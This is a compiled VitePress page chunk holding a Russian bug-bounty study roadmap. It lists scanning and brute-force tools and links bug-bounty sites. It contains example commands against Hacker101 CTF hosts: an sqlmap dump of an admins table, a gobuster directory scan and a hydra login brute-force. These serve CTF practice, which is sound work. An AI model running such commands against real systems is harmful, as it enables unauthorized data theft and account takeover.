import{_ as t,c as e,o as a,a2 as r}from"./chunks/framework.BSzcDgWL.js";const b=JSON.parse('{"title":"Roadmap","description":"","frontmatter":{},"headers":[],"relativePath":"testing/security/roadmap.md","filePath":"testing/security/roadmap.md"}'),o={name:"testing/security/roadmap.md"},s=r('<h1 id="roadmap" tabindex="-1">Roadmap <a class="header-anchor" href="#roadmap" aria-label="Permalink to &quot;Roadmap&quot;">​</a></h1><ol><li>Получение новых знаний и навыков</li><li>Нахождение багов</li><li>Составление корректного отчета о найденном баге</li></ol><h2 id="инструменты" tabindex="-1">Инструменты: <a class="header-anchor" href="#инструменты" aria-label="Permalink to &quot;Инструменты:&quot;">​</a></h2><ul><li>nmap - сканирование открытых портов</li><li>sqlmap - сканирование на sql инъекции</li><li>gobuster - сканирование на поддомены, директории</li><li>hydra - brute force логина/пароля</li></ul><h2 id="примеры-использования-инструментов" tabindex="-1">Примеры использования инструментов <a class="header-anchor" href="#примеры-использования-инструментов" aria-label="Permalink to &quot;Примеры использования инструментов&quot;">​</a></h2><ul><li>sqlmap -u &quot;<a href="https://87712c999b75e62ae32cdf2d219d057c.ctf.hacker101.com/login" target="_blank" rel="noreferrer">https://87712c999b75e62ae32cdf2d219d057c.ctf.hacker101.com/login</a>&quot; --method=&quot;POST&quot; --data=&quot;username=123&amp;password=123&quot; -v 2 --dbms &quot;MySQL&quot; --threads 5 --dump -T admins</li><li>gobuster dir -u &quot;<a href="https://50268e340771b49bd51c70d2bd81195d.ctf.hacker101.com" target="_blank" rel="noreferrer">https://50268e340771b49bd51c70d2bd81195d.ctf.hacker101.com</a>&quot; -w ~/Documents/projects/pentest/SecLists/Discovery/Web-Content/ Logins.fuzz.txt</li><li>hydra -V -t 32 -L ~/Documents/projects/pentest/SecLists/Usernames/Names/names.txt -p password https-post-form://50268e340771b49bd51c70d2bd81195d.ctf.hacker101.com/login:&quot;username=^USER^&amp;password=^PASS^&quot;:&quot;Invalid username&quot;</li></ul><h2 id="регистрация-на-саитах" tabindex="-1">Регистрация на сайтах <a class="header-anchor" href="#регистрация-на-саитах" aria-label="Permalink to &quot;Регистрация на сайтах&quot;">​</a></h2><ul><li><a href="https://hacker101.com/" target="_blank" rel="noreferrer">https://hacker101.com/</a> (ctf)</li><li><a href="https://bugbounty.ru/" target="_blank" rel="noreferrer">https://bugbounty.ru/</a></li><li><a href="https://bugbounty.standoff365.com/" target="_blank" rel="noreferrer">https://bugbounty.standoff365.com/</a></li><li><a href="https://bugbounty.bi.zone/" target="_blank" rel="noreferrer">https://bugbounty.bi.zone/</a></li></ul>',8),l=[s];function i(n,c,d,u,h,m){return a(),e("div",null,l)}const f=t(o,[["render",i]]);export{b as __pageData,f as default};